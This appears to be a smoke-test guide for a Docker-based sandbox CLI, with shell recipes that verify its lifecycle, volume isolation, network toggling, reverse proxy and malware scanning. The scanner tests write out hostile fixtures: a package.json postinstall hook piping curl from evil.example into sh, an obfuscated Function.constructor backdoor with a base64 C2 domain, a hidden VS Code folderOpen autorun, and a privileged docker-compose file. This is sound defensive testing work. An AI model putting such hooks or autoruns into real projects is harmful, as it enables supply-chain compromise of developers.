# Smoke tests — recipes for verifying every phase

This is the canonical "show me it works" companion to the unit/integration test suite. Every recipe here is **self-contained**: a fixture you can paste into your shell, a `sandbox` command to run, and the output you should see.

It exists because:

- New contributors (human or AI) need a way to verify a feature without reading the implementation first.
- PR test plans should link to a section here instead of restating recipes inline.
- When a regression slips past `cargo test`, the next person should be able to bisect it quickly with a known-good recipe.

## Conventions

- Fixtures live under `/tmp/sb-<short-name>/`. Delete them with `rm -rf` (no state to clean) unless the recipe ran `sandbox run`, in which case use `sandbox nuke /tmp/sb-<name> -y`.
- **Headless** recipes need only the compiled binary (`cargo build`). **Live** recipes need a Docker daemon up. Each section labels which kind it is.
- Expected outputs are abbreviated — exit code is what matters most; full text snippets show enough to disambiguate failure modes.
- Assume Linux. macOS notes are in the [README's "Supported platforms"](../../README.md#supported-platforms) section.

## Before you start

```sh
cd ~/Dev/projects/sandbox
cargo build --workspace             # produces target/debug/sandbox
SB="$(pwd)/target/debug/sandbox"    # used in every recipe below
```

If you also want the Docker-backed integration tests:

```sh
cargo test --workspace --features docker-tests
```

The recipes below assume `$SB` is set.

---

## Phase 1 — lifecycle MVP

**Session setup** — run once per shell, then every `$SB …` recipe below works:

```sh
cd ~/Dev/projects/sandbox && cargo build --workspace
SB="$(pwd)/target/debug/sandbox"
```

### 1.1 Headless: `run --print-cmd` on a fresh node project

```sh
mkdir -p /tmp/sb-node && echo '{"name":"itest"}' > /tmp/sb-node/package.json
$SB --print-cmd run /tmp/sb-node
```

Expect the rendered `docker run …` invocation, including:

- `--volume /tmp/sb-node:/app:ro` — source RO (Phase 2 default)
- `--volume sandbox-<hash>-node_modules:/app/node_modules` — named volume (Phase 2)
- `--network sandbox-internal` — no internet (Phase 2)
- `--cap-drop ALL --security-opt no-new-privileges` — hardening (Phase 1)
- `--user 1000:1000 --workdir /app` — your host uid/gid (Phase 1)
- `--entrypoint /bin/bash <image>` — shell override (Phase 3 fix)

### 1.2 Headless: bun gets priority over node when both detectors match

```sh
mkdir -p /tmp/sb-bun && echo '{"name":"itest"}' > /tmp/sb-bun/package.json
touch /tmp/sb-bun/bun.lock
$SB --print-cmd run /tmp/sb-bun
```

Expect `oven/bun:1.3.6` as the image (priority 10 vs node's 0). Validates the `priority` tie-breaker from OQ-005.

### 1.3 Live: full run → exit → re-enter → down → nuke cycle

```sh
mkdir -p /tmp/sb-life && echo '{"name":"itest"}' > /tmp/sb-life/package.json
$SB run /tmp/sb-life                  # scans, then drops into bash inside /app
# inside the container:
ls -la /app                            # see package.json
exit                                   # shell ends — container STAYS running (PID 1 = sleep infinity)

$SB exec /tmp/sb-life -- whoami       # works — container is still up
$SB attach /tmp/sb-life               # hop back into the shell (no re-scan); `exit` again
$SB down /tmp/sb-life                 # stop, keep state/volumes
$SB exec /tmp/sb-life -- whoami       # NOW errors: container not running (exit 40)
$SB run /tmp/sb-life                  # wakes it (docker start) + re-scans; `exit`
$SB nuke /tmp/sb-life -y              # remove everything
```

`exit` only ends the `docker exec` shell — the container keeps running until
`sandbox down`. State lives at `~/.local/share/sandbox/containers/<hash>/meta.toml`;
`nuke` clears it. (See 6.8 for the dedicated `attach` recipe.)

---

## Phase 2 — volume strategy + network isolation

**Session setup** — run once per shell, then every `$SB …` recipe below works:

```sh
cd ~/Dev/projects/sandbox && cargo build --workspace
SB="$(pwd)/target/debug/sandbox"
```

### 2.1 Headless: source is RO in safe, RW under `--unsafe`

```sh
mkdir -p /tmp/sb-vol && echo '{"name":"itest"}' > /tmp/sb-vol/package.json
$SB --print-cmd run /tmp/sb-vol           | grep -o ":/app:ro\b"        # → :/app:ro
$SB --print-cmd run /tmp/sb-vol --unsafe  | grep -o ":/app\b"           # → :/app (no :ro)
```

### 2.2 Headless: lockfile state-dir bind selection

```sh
mkdir -p /tmp/sb-lock && echo '{"name":"itest"}' > /tmp/sb-lock/package.json
# No lockfile on host yet — manifest's primary_lock_file
# (package-lock.json for node) is bound as a stub so npm i works on
# first run. Non-primary entries (pnpm-lock.yaml, yarn.lock) are NOT
# bound until they exist on host or get seeded.
$SB --print-cmd run /tmp/sb-lock | grep "/lockfiles/"
# → exactly ONE bind: /lockfiles/package-lock.json:/app/package-lock.json

# Add a non-primary lockfile alongside; it now joins the bind set:
touch /tmp/sb-lock/pnpm-lock.yaml
$SB --print-cmd run /tmp/sb-lock | grep -c "/lockfiles/"
# → 2  (primary + the host-present pnpm-lock.yaml)
```

Validates the [ADR-0003 mount-on-RO fix](adrs/0003-volume-strategy.md): we bind lockfiles present on host, already seeded in state-dir, or the manifest's primary when none exist yet. The primary-fallback path touches an empty stub on the host so Docker can mount-on-RO; logged at INFO so it's visible in the run output.

### 2.3 Headless: `--network` keeps source RO

```sh
$SB --print-cmd run /tmp/sb-vol --network | grep -E "(:/app:ro|--network bridge)"
# → both lines present: source still RO, internet allowed.
```

---

## Phase 3 — lifecycle observability

**Session setup** — run once per shell, then every `$SB …` recipe below works:

```sh
cd ~/Dev/projects/sandbox && cargo build --workspace
SB="$(pwd)/target/debug/sandbox"
```

### 3.1 Live: `ps` filters running by default, `--all` shows everything

```sh
mkdir -p /tmp/sb-ps && echo '{"name":"itest"}' > /tmp/sb-ps/package.json
$SB run /tmp/sb-ps                    # creates + drops you in; type `exit`
# (exit leaves the container RUNNING — PID 1 is a keepalive)

$SB ps                                # → table lists sandbox-<hash>, STATUS=running
$SB down /tmp/sb-ps                   # stop it (state kept)
$SB ps                                # → "no sandbox containers" (running filter hides stopped)
$SB ps --all                          # → table with STATUS=exited
$SB ps --all --format json            # → JSON array with state="exited"
$SB nuke /tmp/sb-ps -y
```

Columns: `NAME | HASH | LANG | PATH | STATUS | NETWORK | UPTIME | DEPS`. DEPS lists compose deps brought up via `--with-deps` (Phase 6); `—` when the project has none.

### 3.2 Live: exit code 40 on `logs`/`exec` against missing container

```sh
mkdir -p /tmp/sb-exit && echo '{}' > /tmp/sb-exit/package.json
$SB logs /tmp/sb-exit; echo "exit=$?"
# → error: no sandbox container for `sandbox-<hash>` ...
# → exit=40
```

### 3.3 Headless: `nuke` confirmation prompt and `-y` bypass

```sh
echo "n" | $SB nuke /tmp/sb-exit
# → About to remove container, 3 named volume(s), state directory for `sandbox-<hash>`. Continue? [y/N]
# → aborted

$SB nuke /tmp/sb-exit -y              # no prompt
```

---

## Phase 4a — static scan pipeline (YARA + heuristics + compose)

**Session setup** — run once per shell, then every `$SB …` recipe below works:

```sh
cd ~/Dev/projects/sandbox && cargo build --workspace
SB="$(pwd)/target/debug/sandbox"
```

### 4.1 Headless: clean project exits 0

```sh
mkdir -p /tmp/sb-clean && echo '{"name":"x"}' > /tmp/sb-clean/package.json
$SB scan /tmp/sb-clean
# → clean — no findings (content_hash=…, cache=miss)
# → exit 0
```

### 4.2 Headless: Lazarus-shaped fixture exits 30 with 3 findings

```sh
mkdir -p /tmp/sb-evil && cat > /tmp/sb-evil/server.js <<'EOF'
const _ = new (Function.constructor)('require','m','...');
const c2 = 'Y2hhaW5saW5rLWFwaS12My5saXY=';
const endpoint = '/api/service/token/abc';
EOF
$SB scan /tmp/sb-evil --explain
```

Expect 3 findings (sorted by severity), exit 30:

| Severity | Rule | Why |
|---|---|---|
| critical | `yara/contagious_interview_profile_js` | All three needles together: `Function.constructor` eval, base64-encoded chainlink C2, `/api/service/token` endpoint. The exact backdoor shape from incident-2026-05-06. |
| high | `yara/contagious_interview_c2_domain` | Base64 `Y2hhaW5saW5rLWFwaS12My5saXY=` matches the C2 domain family alone. |
| high | `heuristics/eval_function_constructor` | Catches `new (Function.constructor)(…)` even without the C2 needles. |

The synthetic file is **not** real malware — it's a fixture built from the IoC report at `~/Dev/projects/studies/gala-chain/challenges/incident-2026-05-06-ctrading/iocs/iocs.md`.

### 4.3 Headless: malicious `tasks.json` autorun

```sh
mkdir -p /tmp/sb-vscode/.vscode && cat > /tmp/sb-vscode/.vscode/tasks.json <<'EOF'
{
  "version": "2.0.0",
  "tasks": [{
    "label": "post",
    "type": "shell",
    "command": "node .vscode/cancel",
    "runOn": "folderOpen",
    "presentation": { "hide": true, "reveal": "never" }
  }]
}
EOF
$SB scan /tmp/sb-vscode --explain
```

Expect:
- `yara/contagious_interview_vscode_autorun` (critical) — strict shape match
- `heuristics/vscode_tasks_autorun` (high) — looser shape (any `folderOpen` task)

### 4.4 Headless: `package.json` lifecycle hook with `curl | sh`

```sh
mkdir -p /tmp/sb-supply && cat > /tmp/sb-supply/package.json <<'EOF'
{
  "name": "supply-chain-victim",
  "scripts": {
    "postinstall": "curl -s https://evil.example/bootstrap.sh | sh"
  }
}
EOF
$SB scan /tmp/sb-supply --explain
```

Expect `heuristics/package_json_pipe_to_shell` (high). Same family fires on `wget`, `fetch`, and on `node -e`/`--eval` (`heuristics/package_json_node_eval`).

### 4.5 Headless: base64 decode → network call within 12 lines

```sh
mkdir -p /tmp/sb-net && cat > /tmp/sb-net/app.js <<'EOF'
const c2 = Buffer.from('aGVsbG8=', 'base64').toString();
require('https').get(c2 + '/api', () => {});
EOF
$SB scan /tmp/sb-net --explain
```

Expect `heuristics/base64_then_network` (high). Move the `require('https')` call >12 lines away and the finding disappears (proximity heuristic).

### 4.6 Headless: vulnerable `docker-compose.yml`

```sh
mkdir -p /tmp/sb-compose && cat > /tmp/sb-compose/docker-compose.yml <<'EOF'
services:
  evil:
    image: alpine
    privileged: true
    network_mode: host
    cap_add:
      - SYS_ADMIN
    volumes:
      - "/var/lib/docker:/host-docker"
      - "/etc:/host-etc:ro"
    security_opt:
      - "seccomp:unconfined"
EOF
$SB scan /tmp/sb-compose --explain
```

Expect 6 findings, all `compose/*`:

- `compose/privileged` (critical)
- `compose/network_mode_host` (critical)
- `compose/cap_add` for `SYS_ADMIN` (critical) — others would be high
- `compose/dangerous_host_mount` for `/var/lib/docker` (critical, RW) and `/etc` (high, RO)
- `compose/security_opt_unconfined` (critical) — seccomp disabled

### 4.7 Live: pre-flight blocks `sandbox run`

```sh
$SB run /tmp/sb-evil
# → sandbox scan blocked the run — 3 finding(s) at severity ≥ high:
# → [critical] yara/contagious_interview_profile_js …
# → exit 30

$SB run /tmp/sb-evil --unsafe
# → scan skipped; container launches
```

### 4.8 Headless: `--no-scan` without `--unsafe` is rejected

```sh
$SB run /tmp/sb-clean --no-scan; echo "exit=$?"
# → error: --no-scan requires --unsafe (the scan cannot be skipped in safe/paranoid mode)
# → exit=1
```

### 4.9 Headless: scan suppression by `(rule_id, project_hash)`

```sh
# Get the project's short hash:
HASH=$($SB scan /tmp/sb-evil --format json 2>/dev/null | grep -o '"content_hash": *"[^"]*' | head -1 | awk -F'"' '{print $4}' | cut -c1-12)

mkdir -p ~/.config/sandbox && cat > ~/.config/sandbox/scan-ignore.toml <<EOF
[[ignore]]
rule_id = "yara/contagious_interview_c2_domain"
project_hash = "$HASH"
note = "smoke test — false positive simulation"
EOF

$SB scan /tmp/sb-evil --no-cache --explain
# → 2 findings now (c2_domain suppressed); the critical profile_js still fires.
# → exit 30 (the critical is unsuppressed)

rm ~/.config/sandbox/scan-ignore.toml
```

Validates OQ-007 resolution: suppression is keyed by both rule and project. The critical profile_js rule stays — you'd need a separate entry to silence it (which you shouldn't).

### 4.10 Headless: JSON output

```sh
$SB scan /tmp/sb-evil --format json | head -10
# → { "content_hash": "...", "from_cache": ..., "worst_severity": "critical", "findings": [ ... ] }
```

---

## Phase 4b — ClamAV motor

**Session setup** — run once per shell, then every `$SB …` recipe below works:

```sh
cd ~/Dev/projects/sandbox && cargo build --workspace
SB="$(pwd)/target/debug/sandbox"
```

ClamAV runs in an ephemeral docker container; first use builds the bundled scanner image locally (no registry push) and downloads ~300 MB of signatures.

### 4b.1 Live: build image + refresh signature DB

```sh
$SB scan --update-db
# → ensuring scanner image `sandbox/scanner:latest` ...
# → (docker build output, ~30s on first run)
# → refreshing signatures in volume `sandbox-scanner-db` (this may download ~300 MB) ...
# → (freshclam log lines: daily.cvd / main.cvd / bytecode.cvd version + size)
# → scanner DB updated.
```

Re-runs are fast — only delta updates download. Volume `sandbox-scanner-db` persists across machine reboots.

### 4b.2 Live: EICAR test (validates ClamAV is actually scanning)

```sh
mkdir -p /tmp/sb-eicar
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
    > /tmp/sb-eicar/test.com
$SB scan /tmp/sb-eicar --with-clamav --explain
```

Expect a `clamav/Win.Test.EICAR_HDB-1` (critical) finding. EICAR is a harmless string that every AV engine recognizes as a test signature — its presence proves the motor is wired and the signature DB is loaded.

```sh
rm -rf /tmp/sb-eicar
```

### 4b.3 Live: `--with-clamav` on the Lazarus fixture finds nothing extra

```sh
$SB scan /tmp/sb-evil --with-clamav --explain
# → same 3 findings as recipe 4.2 (YARA + heuristic).
# → ClamAV motor ran silently — synthetic fixtures don't match real AV signatures.
```

Useful sanity check: if ClamAV starts firing on `/tmp/sb-evil`, the signature DB is matching on something unintended (false positive worth investigating).

### 4b.4 Live: `--with-clamav` exits 20 when DB volume missing

```sh
docker volume rm sandbox-scanner-db    # destroy the DB
$SB scan /tmp/sb-eicar --with-clamav
# → error: ClamAV signature DB not initialized — run `sandbox scan --update-db` first
# → exit=20
```

Restore with `$SB scan --update-db`.

### 4b.5 Live: pre-flight with ClamAV in `sandbox run`

```sh
$SB run /tmp/sb-evil --with-clamav
# → same pre-flight blocking as recipe 4.7, but ClamAV stage ran too.
# → exit 30
```

---

## Phase 5 — reverse proxy

**Session setup** — run once per shell, then every `$SB …` recipe below works:

```sh
cd ~/Dev/projects/sandbox && cargo build --workspace
SB="$(pwd)/target/debug/sandbox"
```

Hostname model is `<slug>.sandbox.localhost:<PORT>` per ADR-0005. Each port the
project exposes becomes a Traefik entryPoint that binds on the host; the
project container joins both `sandbox-internal` (egress-restricted) and
`sandbox-proxy` (Traefik routing). The proxy itself is opt-in via
`sandbox proxy start`.

### No host setup required

The `.localhost` TLD resolves to loopback by mandate of [RFC 6761](https://datatracker.ietf.org/doc/html/rfc6761#section-6.3).
On modern glibc (`nss-myhostname` enabled by default) and macOS this works
out of the box — `curl sb-web.sandbox.localhost:3000` reaches the proxy with
zero `/etc/hosts` edits and no dnsmasq.

To confirm your resolver supports it:

```sh
getent hosts anything.sandbox.localhost
# → ::1             anything.sandbox.localhost   (or 127.0.0.1, both fine)
```

If `getent` returns nothing, your system lacks `nss-myhostname` (or has it
disabled in `/etc/nsswitch.conf`). Workaround per project:

```sh
echo "127.0.0.1   sb-web.sandbox.localhost" | sudo tee -a /etc/hosts
```

### 5.1 Headless: port detection from `.env` + source regex

```sh
mkdir -p /tmp/sb-ports && cat > /tmp/sb-ports/package.json <<'EOF'
{"name":"itest","scripts":{}}
EOF
echo 'PORT=5007' > /tmp/sb-ports/.env
cat > /tmp/sb-ports/server.js <<'EOF'
const app = require('express')();
app.listen(3000);
EOF

$SB --print-cmd run /tmp/sb-ports
```

Expect the `docker run …` invocation to carry both ports:

- `--label traefik.enable=true`
- `--label traefik.http.routers.sb-sb-ports-3000.rule=Host(\`sb-ports.sandbox.localhost\`)`
- `--label traefik.http.routers.sb-sb-ports-5007.rule=Host(\`sb-ports.sandbox.localhost\`)`
- plus the `loadbalancer.server.port` labels for each.

The `--print-cmd` output shows only the primary `--network sandbox-internal`;
the second network (`sandbox-proxy`) is attached at runtime via
`docker network connect` because `docker run --network` accepts only one
network. See `lifecycle::run` in `sandbox-docker`.

### 5.2 Headless: `--expose` overrides detection

```sh
$SB --print-cmd run /tmp/sb-ports --expose 8080 --expose 9090
```

Expect only `port-8080` and `port-9090` in the labels; the auto-detected
3000/5007 are ignored when the CLI passes overrides.

### 5.3 Headless: no detection + no override = no proxy labels

```sh
mkdir -p /tmp/sb-noport && echo '{"name":"x"}' > /tmp/sb-noport/package.json
$SB --print-cmd run /tmp/sb-noport | grep -c traefik || true
# → if the manifest has `default_port` (node does, 3000), one Host rule
#   appears anyway because detection falls through to that default. Override
#   with --expose 0 (or remove `default_port` from a custom manifest) to
#   produce a label-free run.
```

### 5.4 Live: bring the proxy up (no projects)

```sh
$SB proxy start --dashboard
$SB proxy status
# → traefik service listed under `sandbox-proxy` compose project;
# → state: running

curl -s http://localhost:8090/api/version
# → JSON with version: "3.1.x"

# Dashboard (HTML) at:
# → http://localhost:8090/dashboard/      (trailing slash matters)
```

Note: `curl http://localhost:8090/` (with no path) returns **404 page not
found** — that's expected. Traefik has no root route by design; the API
lives under `/api/*` and the UI under `/dashboard/`. Anything else on
that entryPoint legitimately 404s.

Generated artifacts at `~/.local/share/sandbox/proxy/`:
- `traefik.yaml` (static config with the entryPoints and docker provider)
- `docker-compose.yml` (Traefik service definition)

### 5.5 Live: full round-trip on a real express project

```sh
mkdir -p /tmp/sb-web && cat > /tmp/sb-web/package.json <<'EOF'
{"name":"sb-web","dependencies":{"express":"^4.19.0"}}
EOF
cat > /tmp/sb-web/server.js <<'EOF'
const express = require('express');
const app = express();
app.get('/', (_req, res) => res.send('hello from sandbox\n'));
app.listen(3000);
EOF
$SB run /tmp/sb-web --network --expose 3000   # --network for npm install
# On first run only: alpine:3 is pulled once and a one-shot init
# container chowns each named volume (node_modules, .pnpm-store, .yarn)
# to your host UID — required so `npm install` can write inside.
# See ADR-0003 § Named volume ownership.

# inside the container:
npm install express
node server.js &     # backgrounded; survives `exit`
exit                 # closes the exec session, container stays running

$SB proxy start                               # registers port 3000
curl http://sb-web.sandbox.localhost:3000/
# → hello from sandbox
```

`--network` is needed once for `npm install` (egress); subsequent runs
without it stay isolated. The container's PID 1 is `sleep infinity`
(set by `build_plan`), so `exit` only ends the `docker exec` session —
the container (and anything you backgrounded with `&`) keeps running.
`sandbox down /tmp/sb-web` stops it; `sandbox nuke` removes it.

**Two install footguns to know about:**

- *`npm i` on a project with no lockfile*: works. The manifest's
  `primary_lock_file` (`package-lock.json` for node, `bun.lock` for bun,
  `Cargo.lock` for rust) gets an empty stub touched on the host so Docker
  can mount-on-RO; npm then writes the real lockfile into the state-dir
  bind. The host file stays empty until `sandbox sync-lock` (Phase 6+)
  copies it back.

- *`npm install <new-package>` in safe mode*: fails with `EROFS` against
  `package.json`. Adding a dependency mutates the source itself, which the
  RO bind blocks by design. Either edit `package.json` on the host and
  then `npm i` inside (lockfile-only update works), or run with
  `--unsafe` for that session if you've audited the project.

**If `npm install` fails with `EACCES`** on a project created before the
chown fix landed, the existing named volumes are still root-owned. Reset:

```sh
$SB nuke /tmp/sb-web -y          # drops volumes; next `run` chowns fresh
```

### 5.6 Live: stop / status / logs

```sh
$SB proxy logs --follow      # streams Traefik logs; Ctrl-C to detach
$SB proxy stop               # docker compose down
$SB proxy status             # state: stopped
```

Stopping the proxy doesn't remove the project containers — they keep
running, just unreachable via `<slug>.sandbox.localhost:<PORT>` until the proxy
comes back up. `sandbox run` continues to work the same way (labels are
inert when nothing reads them).

### Cleanup

```sh
$SB proxy stop
$SB nuke /tmp/sb-web -y
$SB nuke /tmp/sb-ports -y
rm -rf /tmp/sb-web /tmp/sb-ports /tmp/sb-noport
docker network rm sandbox-proxy   # optional; auto-recreated next start
# (no /etc/hosts cleanup needed — *.localhost resolves natively via RFC 6761)
```

---

## Phase 6 — runtime network toggle + project compose

**Session setup** — run once per shell, then every `$SB …` recipe below works:

```sh
cd ~/Dev/projects/sandbox && cargo build --workspace
SB="$(pwd)/target/debug/sandbox"
```

> **Re-entry & the two verbs.** Get comfortable with `attach` first (recipes
> **6.7** headless and **6.8** live) — it's how you hop back into a running
> sandbox while testing the toggle. The split matters here:
> - `sandbox attach` **preserves** container state (no scan, no network changes).
> - `sandbox run` is **authoritative**: it re-enforces the profile's network
>   policy, so a default `run` *revokes* a leftover `sandbox net on`. Use `run`
>   to (re)apply policy, `attach` to peek back in without disturbing it.

### 6.1 Live: `sandbox net on/off/status` round-trip + `run` re-enforces policy

**Goal:** confirm the runtime egress toggle attaches and detaches `bridge` against a running safe-mode container, and that `status` reflects the current network attachments.

**Setup:**

```sh
mkdir -p /tmp/sb-nettoggle && cd /tmp/sb-nettoggle
echo '{"name":"sb-nettoggle","version":"0.0.1","scripts":{"start":"node -e \"require(\\\"http\\\").get(\\\"http://example.com\\\",r=>console.log(r.statusCode))\""}}' > package.json
```

**Steps:**

```sh
$SB run .                              # safe mode by default (sandbox-internal, no egress)
# Run the `net` commands from a SECOND terminal while this shell is open.

$SB net status .                       # sandbox-internal (+ sandbox-proxy), egress: off
npm start                              # inside the shell: fails — getaddrinfo EAI_AGAIN (no egress)

$SB net on .                           # attaches bridge → "egress on (attached bridge)"
$SB net status .                       # now lists bridge too; "egress: ON"
npm start                              # inside the shell: prints `200` — egress works
$SB net off .                          # detaches bridge
$SB net status . --format json         # {"egress": false, "networks": ["sandbox-internal", ...]}
```

Now show that **`run` re-enforces policy** while **`attach` preserves it** —
the part that bit us (the toggle survives `down`, so a plain resume would keep
egress):

```sh
$SB net on .                           # egress ON
exit                                   # leave the shell — container stays running
$SB down .                             # stop it (state kept). The bridge stays attached…
$SB net status .                       # …egress: ON  (the toggle survived `down`)

$SB run .                              # DEFAULT run → reconciles to the profile (no egress)
$SB net status .                       # egress: off  ← run revoked the stale `net on`
exit

# Contrast: attach does NOT touch the network.
$SB net on .                           # egress ON again
$SB attach .                           # re-enter WITHOUT changing policy
$SB net status .                       # egress: ON  (attach preserved it)
```

**Pass criteria:**

- `net on` connects bridge (`egress on`); idempotent on re-run (`egress already on`).
- `net off` disconnects bridge; idempotent (`egress already off`); JSON `egress` field flips.
- The toggle **survives `down`** (status still shows bridge on the stopped container).
- A default `sandbox run` **revokes** a stale `net on` (egress back to off) — `run` is authoritative.
- `sandbox attach` **does not** change egress — it preserves whatever state the container is in.

### 6.2 Headless: error paths (no container / not running / would strand)

**Goal:** the failure modes exit with the codes the SRS promises (40 for not-found / not-running, 50 for the "would strand" guard) and print actionable messages.

**Steps:**

```sh
# (a) No container — exit 40.
mkdir -p /tmp/sb-noctr && cd /tmp/sb-noctr
echo '{"name":"sb-noctr"}' > package.json
$SB net status .
echo "exit=$?"                         # exit=40, message points at `sandbox run` first

# (b) Container exists but stopped — exit 40.
#     NOTE: `run </dev/null` does NOT stop the container — PID 1 is a keepalive,
#     so it keeps running in the background (stdin isn't a TTY, so no shell is
#     attached). You must `down` it to reach the not-running path.
mkdir -p /tmp/sb-stopped && cd /tmp/sb-stopped
echo '{"name":"sb-stopped"}' > package.json
$SB run . </dev/null                   # container starts in BG (no shell: stdin not a TTY)
$SB down .                             # now actually stopped
$SB net on .
echo "exit=$?"                         # exit=40 (not running)

# (c) Would-strand guard: --unsafe container whose primary IS bridge.
mkdir -p /tmp/sb-unsafe && cd /tmp/sb-unsafe
echo '{"name":"sb-unsafe"}' > package.json
$SB run . --unsafe                     # in another terminal:
$SB net off .
echo "exit=$?"                         # exit=50, message tells user to `sandbox down` instead
```

**Pass criteria:** all three commands exit non-zero with the codes above; messages are self-contained (no stack traces, no Docker error strings leaked verbatim).

### Cleanup

```sh
$SB down . && $SB nuke . -y
rm -rf /tmp/sb-nettoggle /tmp/sb-noctr /tmp/sb-stopped /tmp/sb-unsafe
```

### 6.3 Live: `--with-deps` end-to-end (safe mode rewire)

**Goal:** confirm `sandbox run --with-deps` discovers the compose file,
validates it, brings up the deps via `docker compose`, rewires them to a
`--internal` network so they lose egress, and attaches the sandbox container
to the same network so it can talk to `postgres` by name.

**Setup:**

```sh
mkdir -p /tmp/sb-deps && cd /tmp/sb-deps
echo '{"name":"sb-deps","version":"0.0.1"}' > package.json
cat > docker-compose.yml <<'YAML'
services:
  postgres:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: dev
YAML
```

**Steps:**

```sh
$SB run . --with-deps
# In a second terminal:
$SB ps
# Should show the sandbox container; meta.toml now records [compose].

cat ~/.local/share/sandbox/containers/$($SB ps --format json | jq -r '.[0].hash')/meta.toml
# Expect:
# [compose]
# file = "/tmp/sb-deps/docker-compose.yml"
# project_name = "sandbox-<short>-deps"
# services = ["postgres"]
# network = "sandbox-compose-<short>"

docker network inspect sandbox-compose-<short> | jq '.[0].Internal'
# Expect: true

docker network inspect sandbox-compose-<short> | jq '.[0].Containers | keys | length'
# Expect: 2 (sandbox container + postgres)

# Inside the sandbox shell:
getent hosts postgres                  # resolves via DNS alias
nc -z postgres 5432 && echo "reachable"
node -e "require('http').get('http://example.com', r => console.log(r.statusCode))"
# Fails with ENOTFOUND — sandbox-internal blocks egress (deps too).

# From the host:
docker exec sandbox-<short>-deps-postgres-1 \
  node -e "require('http').get('http://example.com', r => console.log(r.statusCode))" 2>&1
# Also fails — postgres container has no egress either (rewired to --internal).
```

**Pass criteria:**

- `meta.toml` includes a `[compose]` block with the four fields.
- `sandbox-compose-<short>` network exists and is `--internal`.
- Both sandbox container and postgres are attached to it.
- Sandbox can resolve `postgres` by DNS and reach port 5432.
- Neither sandbox nor postgres can reach the internet (matches safe-mode
  posture).

### 6.4 Live: `--with-deps --network` keeps egress on deps

**Goal:** with `--network`, deps stay on the compose-default bridge and keep
internet egress — the user opted into widening the trust boundary.

```sh
$SB run . --with-deps --network
# Second terminal:
docker network inspect sandbox-<short>-deps_default | jq '.[0].Internal'
# Expect: false  (regular bridge, egress allowed)

# Inside the sandbox:
node -e "require('http').get('http://example.com', r => console.log(r.statusCode))"
# Now prints 200.
```

### 6.5 Headless: discovery error paths

**Goal:** `--with-deps` in a project with no compose file errors cleanly;
multi-match without `--compose-file` errors with the candidate list.

```sh
# (a) No compose file but --with-deps requested.
mkdir -p /tmp/sb-no-compose && cd /tmp/sb-no-compose
echo '{"name":"x"}' > package.json
$SB run . --with-deps
echo "exit=$?"                         # exit=1, message points at --compose-file or drop --with-deps

# (b) Multi-match.
mkdir -p /tmp/sb-multi && cd /tmp/sb-multi
echo '{"name":"x"}' > package.json
cp /tmp/sb-deps/docker-compose.yml ./docker-compose.yml
cp /tmp/sb-deps/docker-compose.yml ./compose.dev.yml
$SB run . --with-deps
echo "exit=$?"                         # exit=1, lists both candidates, suggests --compose-file PATH
```

### 6.6 Live: `down --with-deps` and `nuke` cleanup

**Goal:** the compose deps recorded in `Meta.compose` are torn down by
`down --with-deps` and (automatically) by `nuke`. The `--internal` network
we created is removed too; the compose-default bridge (`--network` mode) is
cleaned up by `docker compose down` itself.

```sh
# Setup from 6.3.
$SB run . --with-deps
$SB down . --with-deps                 # also tears down postgres + removes sandbox-compose-<short>
docker network inspect sandbox-compose-<short>   # Error: No such network

# Re-up + nuke (the unflagged cleanup path):
$SB run . --with-deps
$SB nuke . -y                          # removes container, volumes, state, AND compose deps + network
```

**Pass criteria:** after `down --with-deps`, `docker compose -p sandbox-<short>-deps ps` is empty and the internal network is gone. After `nuke`, the state dir is gone and `meta.toml` no longer exists.

### 6.7 Headless: `attach --print-cmd` renders the manifest shell

**Goal:** `attach` builds the same `docker exec` invocation the shell re-entry uses — host user, manifest workdir, manifest shell — without touching Docker.

```sh
mkdir -p /tmp/sb-attach && cd /tmp/sb-attach
echo '{"name":"sb-attach"}' > package.json
$SB attach --print-cmd .
# docker exec --interactive --tty --user <uid>:<gid> --workdir /app sandbox-<hash> /bin/bash
```

**Pass criteria:** prints a `docker exec` line ending in the manifest shell (`/bin/bash` for node), with `--user <uid>:<gid>` and the manifest `--workdir`. Exit 0, no daemon contact.

### 6.8 Live: `sandbox attach` re-entry (running only; no scan; no auto-start)

**Goal:** confirm `attach` re-enters a running sandbox without re-scanning, that exiting the shell leaves the container up, and that a stopped/missing container is refused with exit 40 (you must `sandbox run` to wake it).

**Steps:**

```sh
mkdir -p /tmp/sb-attach && cd /tmp/sb-attach
echo '{"name":"sb-attach"}' > package.json

$SB run .                              # scans, then drops you in the shell
exit                                   # leaves the container RUNNING (PID 1 = sleep infinity)
$SB ps                                 # sandbox-<hash> still listed as running

$SB attach .                           # back in the shell instantly — no scan output this time
exit                                   # still running
$SB attach .                           # repeatable as many times as you like

# Stopped container is refused — waking it must go through `run` (which re-scans):
$SB down .                             # stops, keeps state
$SB attach .
echo "exit=$?"                         # exit=40, message points at `sandbox run` first
$SB run .                              # re-scans and resumes; exit the shell again

# Missing container:
mkdir -p /tmp/sb-attach-none && cd /tmp/sb-attach-none
echo '{"name":"none"}' > package.json
$SB attach .
echo "exit=$?"                         # exit=40
```

**Pass criteria:**

- `attach` on a running container re-enters the shell and emits **no scan output** (contrast with `run`).
- Exiting the shell leaves the container running (`ps` still shows it); attach/exit is repeatable indefinitely.
- `attach` against a stopped container exits 40 (never auto-starts it).
- `attach` against a never-created container exits 40.

**Cleanup:**

```sh
$SB nuke /tmp/sb-attach -y 2>/dev/null
rm -rf /tmp/sb-attach /tmp/sb-attach-none
```

### 6.9 Live: exposing a port does NOT grant egress (proxy-network isolation)

**Goal:** regression guard for the egress leak — a safe-mode project that
exposes a port joins `sandbox-proxy`, but that network is `--internal`, so the
sandbox still can't reach the internet. (Before the fix, node's `default_port`
silently put the container on an egress-capable proxy bridge.)

> **One-time migration:** if you ran an older build, the `sandbox-proxy` network
> may still exist as a non-internal bridge. Remove it once so `ensure_internal`
> recreates it correctly: `$SB proxy stop 2>/dev/null; docker network rm sandbox-proxy 2>/dev/null` (stop any sandbox on it first).

**Steps:**

```sh
mkdir -p /tmp/sb-egress && cd /tmp/sb-egress
# Node project, no server code — default_port (3000) alone makes it join sandbox-proxy.
echo '{"name":"sb-egress","scripts":{"start":"node -e \"require(\\\"http\\\").get(\\\"http://example.com\\\",r=>console.log(r.statusCode)).on(\\\"error\\\",e=>console.log(\\\"blocked\\\",e.code))\""}}' > package.json

$SB run .
$SB net status .                       # sandbox-internal + sandbox-proxy, egress: off

# verify the proxy network really is internal:
docker network inspect sandbox-proxy --format '{{.Internal}}'   # → true

